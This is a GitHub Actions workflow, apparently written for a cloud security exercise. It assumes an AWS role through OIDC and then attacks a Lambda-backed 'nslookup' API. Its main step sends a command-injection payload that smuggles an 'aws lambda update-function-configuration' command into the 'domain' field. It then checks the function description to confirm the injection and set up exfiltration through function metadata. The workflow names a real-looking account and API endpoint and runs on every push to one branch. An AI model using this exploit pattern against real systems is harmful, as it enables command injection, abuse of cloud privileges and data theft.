name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda & Exfiltrate via Function Metadata

        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
    
          # Test 1: Can lambdaRole update its own description?
          PAYLOAD='{"domain": "127.0.0.1; aws lambda update-function-configuration --function-name nslookupv2 --description \"TEST-UPDATE-WORKS\" --region us-east-1"}'
          curl -s -X POST "$URL" -H "Content-Type: application/json" -d "$PAYLOAD"
          sleep 5
    
          # Check from GitHub side
          aws lambda get-function --function-name nslookupv2 --query 'Configuration.Description' --output text
